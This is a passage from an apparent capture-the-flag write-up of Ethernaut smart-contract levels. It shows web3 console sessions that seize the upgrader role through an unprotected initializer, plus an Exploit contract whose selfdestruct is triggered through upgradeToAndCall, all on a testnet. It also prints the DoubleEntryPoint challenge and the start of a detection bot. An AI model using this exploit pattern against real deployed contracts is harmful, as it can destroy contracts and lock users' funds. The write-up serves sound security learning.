function_">_upgradeToAndCall</span>(<span class="params"></span></span><br><span class="line"><span class="params">        address newImplementation,</span></span><br><span class="line"><span class="params">        bytes memory data</span></span><br><span class="line"><span class="params">    </span>) internal &#123;</span><br><span class="line">        <span class="comment">// Initial upgrade and setup call</span></span><br><span class="line">        <span class="title function_">_setImplementation</span>(newImplementation);</span><br><span class="line">        <span class="keyword">if</span> (data.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            (bool success,) = newImplementation.<span class="title function_">delegatecall</span>(data);</span><br><span class="line">            <span class="built_in">require</span>(success, <span class="string">&quot;Call failed&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Stores a new address in the EIP1967 implementation slot.</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_setImplementation</span>(<span class="params">address newImplementation</span>) private &#123;</span><br><span class="line">        <span class="built_in">require</span>(<span class="title class_">Address</span>.<span class="title function_">isContract</span>(newImplementation), <span class="string">&quot;ERC1967: new implementation is not a contract&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="title class_">AddressSlot</span> storage r;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            r_slot := _IMPLEMENTATION_SLOT</span><br><span class="line">        &#125;</span><br><span class="line">        r.<span class="property">value</span> = newImplementation;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>To complete this challenge, we need to <strong><code>selfdestruct</code></strong> the <code>Engine</code> contract and make it unusable. Let us look at the contract <code>_upgradeToAndCall</code>. The function sets the <code>newImplementation</code> and <strong>delegatecall’s</strong> it with the given data, so we can make our contract with the <code>selfdestruct</code> function and make the <code>Engine</code> contract <strong>execute <code>selfdestruct</code> delegately the engine contract gets destroyed</strong>. However, to run the <code>upgradeToAndCall</code> function, we need to be the <code>upgrader</code> set in the <code>initialize</code> function, which has the <code>initializer</code> modifier. If we check the <code>Initializable</code> contract, the modifier <code>initializer</code> does not track the owner. Anyone, a contract’s constructor or an externally owned account, can call the <code>initialize</code> function. Since we can call the <code>initialize</code> function, we can become the <code>upgrader</code> and call the <code>upgradeToAndCall</code> function to our contract and execute the <code>selfdestruct</code> function to achieve our goal.</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">In [<span class="number">636</span>]: ad = <span class="string">&#x27;0x44b8d7b44f7DecE5204ddB076549e73E63C5133c&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">637</span>]: io.eth.get_storage_at(ad,<span class="number">0</span>)</span><br><span class="line">Out[<span class="number">637</span>]: HexBytes(<span class="string">&#x27;0x000000000000000000003a78ee8462bd2e31133de2b8f1f9cbd973d6edd60001&#x27;</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">638</span>]: io.eth.get_storage_at(ad,<span class="number">0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</span>)</span><br><span class="line">Out[<span class="number">638</span>]: HexBytes(<span class="string">&#x27;0x000000000000000000000000e1a018e5720c1d6599bb58213fa8f2188803949f&#x27;</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">639</span>]: io.toChecksumAddress(<span class="string">&#x27;0xe1a018e5720c1d6599bb58213fa8f2188803949f&#x27;</span>)</span><br><span class="line">Out[<span class="number">639</span>]: <span class="string">&#x27;0xe1a018E5720c1D6599Bb58213fA8f2188803949f&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">640</span>]: ad = <span class="string">&#x27;0xe1a018E5720c1D6599Bb58213fA8f2188803949f&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">641</span>]: io.eth.get_storage_at(ad,<span class="number">0</span>)</span><br><span class="line">Out[<span class="number">641</span>]: HexBytes(<span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">642</span>]: initialize_selector = io.soliditySha3(abi_types=[<span class="string">&#x27;string&#x27;</span>],values=[<span class="string">&#x27;initialize()&#x27;</span>])[:<span class="number">4</span>].<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">In [<span class="number">643</span>]: initialize_selector</span><br><span class="line">Out[<span class="number">643</span>]: <span class="string">&#x27;0x8129fc1c&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">644</span>]: calldata = initialize_selector.ljust(<span class="number">74</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">645</span>]: calldata</span><br><span class="line">Out[<span class="number">645</span>]: <span class="string">&#x27;0x8129fc1c0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">646</span>]: tx = &#123;<span class="string">&#x27;to&#x27;</span>: ad, <span class="string">&#x27;from&#x27;</span>: pub, <span class="string">&#x27;data&#x27;</span>: calldata, <span class="string">&#x27;chainId&#x27;</span>: <span class="number">11155111</span>, <span class="string">&#x27;nonce&#x27;</span>: io.eth.get_transaction_count(pub), <span class="string">&#x27;gasPrice&#x27;</span>: io.eth.gas_price&#125;</span><br><span class="line"></span><br><span class="line">In [<span class="number">647</span>]: tx[<span class="string">&#x27;gas&#x27;</span>] = io.eth.estimate_gas(tx)</span><br><span class="line"></span><br><span class="line">In [<span class="number">648</span>]: stx = io.eth.account.sign_transaction(tx,p)</span><br><span class="line"></span><br><span class="line">In [<span class="number">649</span>]: hsh = io.eth.send_raw_transaction(stx.rawTransaction)</span><br><span class="line"></span><br><span class="line">In [<span class="number">650</span>]: io.eth.wait_for_transaction_receipt(hsh)</span><br><span class="line">Out[<span class="number">650</span>]:</span><br><span class="line">AttributeDict(&#123;<span class="string">&#x27;blockHash&#x27;</span>: HexBytes(<span class="string">&#x27;0x2af5b7e55ef346d8d2d67f88783ad36a80c5c50cf5e766c5a01f3b0313e4c80c&#x27;</span>),</span><br><span class="line"> <span class="string">&#x27;blockNumber&#x27;</span>: <span class="number">2383870</span>,</span><br><span class="line"> <span class="string">&#x27;contractAddress&#x27;</span>: <span class="literal">None</span>,</span><br><span class="line"> <span class="string">&#x27;cumulativeGasUsed&#x27;</span>: <span class="number">66676</span>,</span><br><span class="line"> <span class="string">&#x27;effectiveGasPrice&#x27;</span>: <span class="number">3620000000</span>,</span><br><span class="line"> <span class="string">&#x27;from&#x27;</span>: <span class="string">&#x27;0x25Bf651a048be8420997944C92c80e5064C1c5d6&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;gasUsed&#x27;</span>: <span class="number">66676</span>,</span><br><span class="line"> <span class="string">&#x27;logs&#x27;</span>: [],</span><br><span class="line"> <span class="string">&#x27;logsBloom&#x27;</span>: HexBytes(<span class="string">&#x27;0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span>),</span><br><span class="line"> <span class="string">&#x27;status&#x27;</span>: <span class="number">1</span>,</span><br><span class="line"> <span class="string">&#x27;to&#x27;</span>: <span class="string">&#x27;0xe1a018E5720c1D6599Bb58213fA8f2188803949f&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;transactionHash&#x27;</span>: HexBytes(<span class="string">&#x27;0x0a6f9a70d20aa6e24f269278a6e59955d8a287f69a38fbcc26f7eb5473077fd4&#x27;</span>),</span><br><span class="line"> <span class="string">&#x27;transactionIndex&#x27;</span>: <span class="number">0</span>,</span><br><span class="line"> <span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;0x0&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">In [<span class="number">651</span>]: io.eth.get_storage_at(ad,<span class="number">0</span>)</span><br><span class="line">Out[<span class="number">651</span>]: HexBytes(<span class="string">&#x27;0x0000000000000000000025bf651a048be8420997944c92c80e5064c1c5d60001&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>now we are the <code>upgrader</code> of the logic contract (not the proxy contract) and we can call the <code>upgradeToAndCall</code> function to destroy the contract.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Exploit</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">exploit</span>(<span class="params"></span>) public&#123;</span><br><span class="line">    <span class="title function_">selfdestruct</span>(<span class="title function_">payable</span>(<span class="title function_">address</span>(<span class="number">0x25Bf651a048be8420997944C92c80e5064C1c5d6</span>)));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">653</span>]: calldata = <span class="string">&#x27;0x4f1ef286000000000000000000000000aa63738a312c1c1a3e553b57423145d668877df40000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000000463d9b77</span></span><br><span class="line"><span class="string">     ...: 000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">654</span>]: tx = &#123;<span class="string">&#x27;to&#x27;</span>: ad, <span class="string">&#x27;from&#x27;</span>: pub, <span class="string">&#x27;data&#x27;</span>: calldata, <span class="string">&#x27;chainId&#x27;</span>: <span class="number">11155111</span>, <span class="string">&#x27;nonce&#x27;</span>: io.eth.get_transaction_count(pub), <span class="string">&#x27;gasPrice&#x27;</span>: io.eth.gas_price&#125;</span><br><span class="line"></span><br><span class="line">In [<span class="number">655</span>]: tx[<span class="string">&#x27;gas&#x27;</span>] = io.eth.estimate_gas(tx)</span><br><span class="line"></span><br><span class="line">In [<span class="number">656</span>]: stx = io.eth.account.sign_transaction(tx,p)</span><br><span class="line"></span><br><span class="line">In [<span class="number">657</span>]: hsh = io.eth.send_raw_transaction(stx.rawTransaction)</span><br><span class="line"></span><br><span class="line">In [<span class="number">658</span>]: io.eth.wait_for_transaction_receipt(hsh)</span><br><span class="line">Out[<span class="number">658</span>]:</span><br><span class="line">AttributeDict(&#123;<span class="string">&#x27;blockHash&#x27;</span>: HexBytes(<span class="string">&#x27;0xc309dbb2ec14e20f9859525903eee9c5f9fe9cd382b9099ed9f7f84f0dbd74a3&#x27;</span>),</span><br><span class="line"> <span class="string">&#x27;blockNumber&#x27;</span>: <span class="number">2383906</span>,</span><br><span class="line"> <span class="string">&#x27;contractAddress&#x27;</span>: <span class="literal">None</span>,</span><br><span class="line"> <span class="string">&#x27;cumulativeGasUsed&#x27;</span>: <span class="number">101255</span>,</span><br><span class="line"> <span class="string">&#x27;effectiveGasPrice&#x27;</span>: <span class="number">4350000000</span>,</span><br><span class="line"> <span class="string">&#x27;from&#x27;</span>: <span class="string">&#x27;0x25Bf651a048be8420997944C92c80e5064C1c5d6&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;gasUsed&#x27;</span>: <span class="number">55011</span>,</span><br><span class="line"> <span class="string">&#x27;logs&#x27;</span>: [],</span><br><span class="line"> <span class="string">&#x27;logsBloom&#x27;</span>: HexBytes(<span class="string">&#x27;0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span>),</span><br><span class="line"> <span class="string">&#x27;status&#x27;</span>: <span class="number">1</span>,</span><br><span class="line"> <span class="string">&#x27;to&#x27;</span>: <span class="string">&#x27;0xe1a018E5720c1D6599Bb58213fA8f2188803949f&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;transactionHash&#x27;</span>: HexBytes(<span class="string">&#x27;0x6d776c95cd5a581e01ccddda8c1ae26f2128f118de963401eca47516e2becc1b&#x27;</span>),</span><br><span class="line"> <span class="string">&#x27;transactionIndex&#x27;</span>: <span class="number">1</span>,</span><br><span class="line"> <span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;0x0&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">In [<span class="number">659</span>]: io.eth.get_storage_at(ad,<span class="number">0</span>)</span><br><span class="line">Out[<span class="number">659</span>]: HexBytes(<span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span>)</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="26-DoubleEntryPoint"><a href="#26-DoubleEntryPoint" class="headerlink" title="26 - DoubleEntryPoint"></a>26 - DoubleEntryPoint</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;openzeppelin-contracts-08/access/Ownable.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">DelegateERC20</span> &#123;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">delegateTransfer</span>(<span class="params">address to, uint256 value, address origSender</span>) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">IDetectionBot</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">handleTransaction</span>(<span class="params">address user, bytes calldata msgData</span>) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">IForta</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setDetectionBot</span>(<span class="params">address detectionBotAddress</span>) external;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">notify</span>(<span class="params">address user, bytes calldata msgData</span>) external;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">raiseAlert</span>(<span class="params">address user</span>) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Forta</span> is <span class="title class_">IForta</span> &#123;</span><br><span class="line">  <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span> =&gt;</span> <span class="title class_">IDetectionBot</span>) public usersDetectionBots;</span><br><span class="line">  <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span> =&gt;</span> uint256) public botRaisedAlerts;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">setDetectionBot</span>(<span class="params">address detectionBotAddress</span>) external override &#123;</span><br><span class="line">      usersDetectionBots[msg.<span class="property">sender</span>] = <span class="title class_">IDetectionBot</span>(detectionBotAddress);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">notify</span>(<span class="params">address user, bytes calldata msgData</span>) external override &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_">address</span>(usersDetectionBots[user]) == <span class="title function_">address</span>(<span class="number">0</span>)) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">try</span> usersDetectionBots[user].<span class="title function_">handleTransaction</span>(<span class="params">user, msgData</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> &#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">raiseAlert</span>(<span class="params">address user</span>) external override &#123;</span><br><span class="line">      <span class="keyword">if</span>(<span class="title function_">address</span>(usersDetectionBots[user]) != msg.<span class="property">sender</span>) <span class="keyword">return</span>;</span><br><span class="line">      botRaisedAlerts[msg.<span class="property">sender</span>] += <span class="number">1</span>;</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">CryptoVault</span> &#123;</span><br><span class="line">    address public sweptTokensRecipient;</span><br><span class="line">    <span class="title class_">IERC20</span> public underlying;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address recipient</span>) &#123;</span><br><span class="line">        sweptTokensRecipient = recipient;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setUnderlying</span>(<span class="params">address latestToken</span>) public &#123;</span><br><span class="line">        <span class="built_in">require</span>(<span class="title function_">address</span>(underlying) == <span class="title function_">address</span>(<span class="number">0</span>), <span class="string">&quot;Already set&quot;</span>);</span><br><span class="line">        underlying = <span class="title class_">IERC20</span>(latestToken);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    ...</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">sweepToken</span>(<span class="params">IERC20 token</span>) public &#123;</span><br><span class="line">        <span class="built_in">require</span>(token != underlying, <span class="string">&quot;Can&#x27;t transfer underlying token&quot;</span>);</span><br><span class="line">        token.<span class="title function_">transfer</span>(sweptTokensRecipient, token.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">LegacyToken</span> is <span class="title class_">ERC20</span>(<span class="string">&quot;LegacyToken&quot;</span>, <span class="string">&quot;LGT&quot;</span>), <span class="title class_">Ownable</span> &#123;</span><br><span class="line">    <span class="title class_">DelegateERC20</span> public delegate;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">mint</span>(<span class="params">address to, uint256 amount</span>) public onlyOwner &#123;</span><br><span class="line">        <span class="title function_">_mint</span>(to, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">delegateToNewContract</span>(<span class="params">DelegateERC20 newContract</span>) public onlyOwner &#123;</span><br><span class="line">        delegate = newContract;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">transfer</span>(<span class="params">address to, uint256 value</span>) public override returns (bool) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">address</span>(delegate) == <span class="title function_">address</span>(<span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">super</span>.<span class="title function_">transfer</span>(to, value);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> delegate.<span class="title function_">delegateTransfer</span>(to, value, msg.<span class="property">sender</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">DoubleEntryPoint</span> is <span class="title class_">ERC20</span>(<span class="string">&quot;DoubleEntryPointToken&quot;</span>, <span class="string">&quot;DET&quot;</span>), <span class="title class_">DelegateERC20</span>, <span class="title class_">Ownable</span> &#123;</span><br><span class="line">    address public cryptoVault;</span><br><span class="line">    address public player;</span><br><span class="line">    address public delegatedFrom;</span><br><span class="line">    <span class="title class_">Forta</span> public forta;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address legacyToken, address vaultAddress, address fortaAddress, address playerAddress</span>) &#123;</span><br><span class="line">        delegatedFrom = legacyToken;</span><br><span class="line">        forta = <span class="title class_">Forta</span>(fortaAddress);</span><br><span class="line">        player = playerAddress;</span><br><span class="line">        cryptoVault = vaultAddress;</span><br><span class="line">        <span class="title function_">_mint</span>(cryptoVault, <span class="number">100</span> ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier <span class="title function_">onlyDelegateFrom</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">sender</span> == delegatedFrom, <span class="string">&quot;Not legacy contract&quot;</span>);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier <span class="title function_">fortaNotify</span>(<span class="params"></span>) &#123;</span><br><span class="line">        address detectionBot = <span class="title function_">address</span>(forta.<span class="title function_">usersDetectionBots</span>(player));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Cache old number of bot alerts</span></span><br><span class="line">        uint256 previousValue = forta.<span class="title function_">botRaisedAlerts</span>(detectionBot);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Notify Forta</span></span><br><span class="line">        forta.<span class="title function_">notify</span>(player, msg.<span class="property">data</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Continue execution</span></span><br><span class="line">        _;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check if alarms have been raised</span></span><br><span class="line">        <span class="keyword">if</span>(forta.<span class="title function_">botRaisedAlerts</span>(detectionBot) &gt; previousValue) <span class="title function_">revert</span>(<span class="string">&quot;Alert has been triggered, reverting&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">delegateTransfer</span>(<span class="params"></span></span><br><span class="line"><span class="params">        address to,</span></span><br><span class="line"><span class="params">        uint256 value,</span></span><br><span class="line"><span class="params">        address origSender</span></span><br><span class="line"><span class="params">    </span>) public override onlyDelegateFrom fortaNotify returns (bool) &#123;</span><br><span class="line">        <span class="title function_">_transfer</span>(origSender, to, value);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>To complete this challenge, we must implement a <code>detection</code> bot that notifies us whenever a potential attack happens. Here in this token, <strong>if we try to sweep LegacyToken, we can sweep DoubleEntryPointToken</strong>, so we need to write a bot that tracks for the LegacyToken sweeps and notify to <code>Forta</code> contract, I have read a <a target="_blank" rel="noopener" href="https://github.com/maAPPsDEV/double-entry-point-attack">blog</a> which explains how exactly to track the transaction for the potential attack and got the script for the bot.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./DoubleEntryPoint.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">DetectionBot</span> is <span class="title class_">IDetectionBot</span> &#123;</span><br><span class="line">  address private vault;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">address _vault</span>) public &#123;</span><br><span class="line">    vault = _vault;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* calldata layout</span></span><br><span class="line"><span class="comment">| calldata offset | length | element                                | type    | example value                                                      |</span></span><br><span class="line"><span class="comment">|-----------------|--------|----------------------------------------|---------|--------------------------------------------------------------------|</span></span><br><span class="line"><span class="comment">| 0x00            | 4      | function signature (handleTransaction) | bytes4  | 0x220ab6aa                                                         |</span></span><br><span class="line"><span class="comment">| 0x04            | 32     | user                                   | address | 0x000000000000000000000000XxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXx |</span></span><br><span class="line"><span class="comment">| 0x24            | 32     | offset of msgData                      | uint256 | 0x0000000000000000000000000000000000000000000000000000000000000040 |</span></span><br><span class="line"><span class="comment">| 0x44            | 32     | length of msgData                      | uint256 | 0x0000000000000000000000000000000000000000000000000000000000000064 |</span></span><br><span class="line"><span class="comment">| 0x64            | 4      | function signature (delegateTransfer) 